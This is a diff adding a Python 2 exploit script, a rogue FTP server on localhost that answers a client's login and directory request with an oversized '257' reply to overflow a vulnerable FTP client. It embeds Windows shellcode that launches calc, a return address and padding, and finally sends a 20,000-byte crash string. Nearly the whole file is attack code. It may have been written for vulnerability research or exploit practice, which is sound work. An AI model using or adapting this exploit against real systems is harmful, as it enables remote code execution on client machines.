@@ -1,0 +1,45 @@
+
+import socket
+
+shellcode=(
+"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
+"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
+"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
+"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
+"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
+"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
+"\x45\x81\x3e\x43\x72\x65\x61\x75" +
+"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
+"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
+"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
+"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
+"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
+"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
+"\x53\x53\x53\x53\x52\x53\xff\xd7")
+
+crash = "A" * 400 + "\xCE\xDF\x19\x76" + shellcode
+
+# "\x29\x78\x63\x00"
+# "\xCE\xDF\x19\x76"
+
+port = 27
+s = socket.socket()
+ip = '127.0.0.1'             
+s.bind((ip, port))            
+s.listen(5)                    
+
+
+print 'Listening on port:', port
+
+crash = "A" * 20000
+ 
+while True:
+        conn, addr = s.accept()     
+        conn.send('220 Welcome the scr1ptk1dd13 FTP Server:\r\n')
+        print(conn.recv(1024))
+        conn.send("331 Username OK\r\n")
+        print(conn.recv(1024))
+        conn.send('230 OK\r\n')
+        print(conn.recv(1024))
+        conn.send('257 "' +crash+ '" is current directory\r\n')
+        print crash
